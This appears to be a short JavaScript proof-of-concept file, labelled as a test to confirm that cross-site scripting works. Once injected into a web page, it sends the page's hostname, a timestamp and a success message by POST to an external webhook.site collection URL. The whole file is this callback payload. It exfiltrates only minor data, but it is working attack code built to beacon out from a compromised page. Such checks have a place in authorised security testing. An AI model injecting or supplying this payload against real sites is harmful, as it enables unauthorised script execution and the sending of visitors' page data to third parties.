// test.js - Simple test to confirm XSS works
fetch('https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
        message: "XSS TEST: Script executed successfully!",
        domain: window.location.hostname,
        time: new Date().toISOString()
    })
});
